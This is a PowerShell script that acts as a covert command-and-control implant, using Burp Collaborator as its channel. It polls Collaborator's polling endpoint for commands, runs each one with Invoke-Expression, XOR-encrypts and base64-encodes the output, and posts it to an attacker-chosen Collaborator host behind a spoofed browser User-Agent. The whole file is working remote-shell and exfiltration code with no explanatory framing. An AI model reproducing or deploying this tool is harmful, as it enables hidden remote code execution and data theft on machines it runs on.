$HEADERS = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
    "Accept-Encoding" = "gzip, deflate"
    "Accept" = "*/*"
    "Accept-Language" = "en"
}
$SECONDS = 500 # Milliseconds



Function connect($hostname, $biid, $key) {

    $command = ""

    while ($command -ne 'exit') {
        if ($command -ne "") {

            $result = execute $command

            send $hostname $command $key $result
            $command = ""
        }

        while ($command -eq '') {
            $content = fetch($biid)
            foreach ($e in $content.responses) {
                    if ($e.protocol -eq 'https' ){
                        $requestToBC = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($e.data.request))
                        $offset = $requestToBC.indexof('command=')
                        if ( $offset -ne -1) {
                            $command = (-join ($requestToBC[($requestToBC.indexof('command=') + 8)..$requestToBC.Length]))
                            $command = [System.Web.HttpUtility]::UrlDecode($command)
                            break
                        }
                    }
            }
            Start-Sleep -Milliseconds $SECONDS
        }

    }
}



Function encode($data) {

    if ($data -eq $null) {
        $data = @()
    } else {
        $data = [system.Text.Encoding]::ASCII.GetBytes($data)
    }
    return $data
}



Function encodeToBase64($data) {

    return [System.Convert]::ToBase64String($data)
}



Function encrypt($data, $key) {

    $bkey = @()
    $kl = $key.length

    for ($i = 0; $i -lt $kl; $i++) {
        $bkey += [int][char]$key[$i % $kl]
    }

    for ($i = 0; $i -lt $data.length; $i++) {
        $data[$i] = $data[$i] -bxor $bkey[$i % $kl]
    }
}



Function execute($command) {

    IEX -Command $command -OutVariable out -ErrorVariable err 2>&1>$null
    $out + $err | Out-String -OutVariable result > $null

    return -join $result
}



Function fetch($biid) {

    $url = 'https://polling.burpcollaborator.net/burpresults'
    $parameters = @{
        "biid" = "$biid"
    }
    $r = Invoke-WebRequest -Method 'Get' -Uri $url -Headers $HEADERS -Body $parameters
    return $r.Content | ConvertFrom-Json

}



Function send($hostname, $command, $key, $result) {

    $command = encode $command
    $result = encode $result

    encrypt $command $key
    encrypt $result $key

    $command = encodeToBase64 $command
    $result = encodeToBase64 $result

    $url = 'https://' + $hostname

    $body = @{
        "command" = "$command"
        "result" = "$result"
    }

    $response = Invoke-WebRequest -Method 'Post' -Uri $url -Headers $HEADERS -Body ($body | ConvertTo-Json) -ContentType "application/json"
}



# Required arguments
$hostname = $args[0] # hostname-2.burpcollaborator.net
$biid = $args[1] # biid-1=

$secureString = Read-Host -AsSecureString -Prompt 'Enter Key'
$key = [System.Net.NetworkCredential]::new("", $secureString).Password



connect $hostname $biid $key
